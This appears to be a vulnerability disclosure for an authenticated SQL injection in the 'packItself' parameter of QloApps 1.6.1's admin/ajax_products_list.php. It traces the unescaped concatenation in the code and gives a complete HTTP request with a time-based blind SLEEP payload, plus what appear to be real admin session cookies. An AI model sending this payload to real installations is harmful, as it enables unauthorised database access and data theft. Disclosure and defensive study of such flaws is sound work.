# Vulnerability Introduction

In the QloApps 1.6.1 version, there is an SQL injection vulnerability in the 'packItself' parameter of the `/admin/ajax_products_list.php` file.  Attackers can execute arbitrary SQL statements by constructing malicious requests, which may lead to data leakage, data tampering, or other malicious operations.

# Vulnerability analysis

Vulnerability corresponding file：admin/ajax_products_list.php

![image-202506100908](https://github.com/lhaizhu/picx-images/raw/refs/heads/main/QloApps/image-202506100908.8dx4bw46at.webp)

On line 54, receive packItself via getValue and concatenate it into $sqlWhere on line 76

![image-202506100911](https://github.com/lhaizhu/picx-images/raw/refs/heads/main/QloApps/image-202506100911.1vywiktbhk.webp)

There is an injection vulnerability in line 95 where $sqlWhere is concatenated into $sql and line 97 where the sql statement is executed through executeS executes without escaping or filtering the content of packItself and concatenating it directly into the statement execution

# Vulnerability recurrence

There is a verification administrator permission in the code, which needs to be accessed after logging in

Construct malicious requests

```
GET /admin/ajax_products_list.php?packItself=123+OR+(SELECT+1044+FROM+(SELECT(SLEEP(5)))WzOB)&q=123 HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PrestaShop-982ef6ed83d922bf6ce9ada599a2fd13=def502007a7e6ee564892223cd1855ee86633c21947cbd4943de4cda296f6a339652a07adbded5c585452aed503337c2fe48b607f29cece4136a0b714f723aa6d2e1304a0e9ea0ceffbacbdc77c49808e39afcc65441603f4acfc7a96516780ffbc7e22390c691534835c62728d0df5f67cf1a4e9efa77947acb9c0944b9056df5bb0693f37c96294a74ed65d2e7da373ce81a576afb62f4995fce32aabcb0eaff5750c4e2d184fc95c6f324a70b293546b4715945f4e56051cb3a5a79e125267a963e2c23027083c9903e390845d98c64f2606a2cef4477fe45d39ddfbc2f67101131998abea607a90238bb1d912fe6adc27e9cc81ec6a1f8f6b804f3e07115a8eea93168fba4857cbeb0be70b5a91d53cdb177bf4f0664bb9b7abcc9dc4c3b0fa9e537b6761695de3fae4040d9e89b29e3810db5bd641abc939214ed65497f743d83601fcf7fb10c024f500f4ce390a8ed2556220d9c97f7258f3a060e; PrestaShop-daf117f818c8eeecfa2bccccdd849a8c=def50200013b2cf79e5ea48d8c6f8c958fb78be0ef42476ea0616e543279bd87c71dd9f768189f1a97409996bb010782d3e2f10d102fd7fc36d3d20999e752ec492c4d82f13b6312cafda8ea6a48a744dbf5dc204b351cce65446af5df7ecab3ce1492af6704a8f2248b47de09d8c2fbfa35c06405607acd8117e02ba6c43a4cbc895dd49893d2053ca0bd3ead643ccc51000ef7e8e8a4ae60e0fffd8599f3f8618ef344e60464045ba3032fbd18c2af210385b5a41f1fb84477677d75af5316af20fd0a3849e0b3436a0c3241527abc603cba0f0347bde902097ff773bec3e51db5747e56e872e159e2eafca5ac3ec138a6154679fcb9cd5662acb7d8d95489219ef730eb60fe5d16584d3a4d43afdc0c8aad9cf2b0e330a1b40bbf66c1f2a34fe7ddceec3190788ce44da7e9b4716e61ea84562c06204b4ef2e5cc954dbc2e1e954e0d2177b4b095da9359c8037e07f1295d81d36200014ac99a3df7cd67249177cafc86021315c0481a55a072137e4c6cd059c8875f10a15ef51424237fe0de5dde5ecaf3c22ccc0ef638f2b381af0e68b9799d52905bd960afcda3f96fcec2ac57fa199c2b989fef07780d000d2da293956e6976098d02e92df9

```

![image-202506100931]([https://github.com/](https://github.com/lhaizhu/picx-images/raw/refs/heads/QloApps/image-202506100931.3yep6mrwiy.webp))

Result of Sqlmap:

![image-202506100928]([https://github.com/](https://github.com/lhaizhu/picx-images/raw/refs/heads/QloApps/image-202506100928.4n7yqnffjd.webp))
